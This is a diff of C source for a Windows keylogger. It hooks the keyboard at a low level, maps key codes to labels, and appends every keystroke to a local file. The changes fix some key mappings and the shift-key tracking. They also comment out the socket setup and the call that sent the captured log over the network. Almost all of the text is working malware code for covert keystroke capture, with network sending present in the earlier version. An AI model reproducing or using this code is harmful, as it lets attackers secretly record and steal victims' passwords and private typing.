@@ -3,7 +3,6 @@
 ///static HINSTANCE hinst;
 static HHOOK handlekeyboard = NULL;
 SOCKET my_sock = INVALID_SOCKET;
-
 const struct keyboard keyboard[] =
 {
 	{ VK_BACK, "[BACK]" },
@@ -77,7 +76,7 @@ const struct keyboard keyboard[] =
 	{ VK_RCONTROL, "[CTRL]" },
 	{ VK_LSHIFT, "[SHIFT]" },
 	{ VK_RSHIFT, "[SHIFT]" },
-	{ VK_OEM_2, "[~]" },
+	{ VK_OEM_2, "[/]" },
 	{ VK_NUMLOCK, "[NUMLOCK]" },
 	{ VK_DIVIDE, "[/]" },
 	{ VK_MULTIPLY, "[*]" },
@@ -101,7 +100,7 @@ const struct keyboard keyboard[] =
 	{ VK_OEM_MINUS, "[-]" },
 	{ VK_OEM_PLUS, "[+]" },
 	{ VK_OEM_1, "[;]" },
-	{ VK_OEM_3, "[/]"},
+	{ VK_OEM_3, "[`]"},
 	{ VK_OEM_4, "[ [ ]" },
 	{ VK_OEM_5, "[\\]" },
 	{ VK_OEM_6, "[ ] ]" },
@@ -127,14 +126,17 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
 	kb = (LPKBDLLHOOKSTRUCT)lparam;
 	for (i = 0; keyboard[i].code != kb->vkCode && keyboard[i].code != 0; i++);
-	if ((keyboard[i].code == VK_SHIFT && wparam == WM_KEYDOWN) || (keyboard[i].code == VK_CAPITAL && wparam == WM_KEYDOWN && (shift == 0)))
+#if 1
+	if ((keyboard[i].code == VK_LSHIFT && wparam == WM_KEYDOWN && shift == 0) || (keyboard[i].code == VK_CAPITAL && wparam == WM_KEYDOWN && (shift == 0)))
 		shift = 1;
-	else if ((keyboard[i].code == VK_SHIFT && wparam == WM_KEYUP) || (keyboard[i].code == VK_CAPITAL && wparam == WM_KEYDOWN && (shift == 1)))
+	else if ((keyboard[i].code == VK_LSHIFT && wparam == WM_KEYUP && shift == 1) || (keyboard[i].code == VK_CAPITAL && wparam == WM_KEYDOWN && (shift == 1)))
 		shift = 0;
+#endif // 0
+
 	if (wparam == WM_KEYDOWN)
 	{
 		save_data(keyboard[i].character);
-		printf("%s %zu\n", keyboard[i].character, strlen(keyboard[i].character));
+		printf("%s %zu %d\n", keyboard[i].character, strlen(keyboard[i].character), shift);
 	}
 	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
 }
@@ -180,11 +182,11 @@ void	save_data(const char *data)
 	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
 		_wperror(L" Open file failed ");
 	_write(_fileno(file), data, (unsigned int)strlen(data));
-	if (nbChar == 61)
+	if (nbChar == 70)
 	{
 		if (vfprintf_s(file, "\n", NULL) < 0)
 			_wperror(L" Add \\n at the end of the file failed ");
-		send_data(my_sock);
+	//	send_data(my_sock);
 		nbChar = 0;
 	}
 
@@ -205,7 +207,7 @@ int	main(void)
 	WSADATA wsadata;
 	
 	WSAStartup(MAKEWORD(2, 0), &wsadata);
-	my_sock = init_socket(my_sock);
+	//my_sock = init_socket(my_sock);
 	setwinhook();				
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
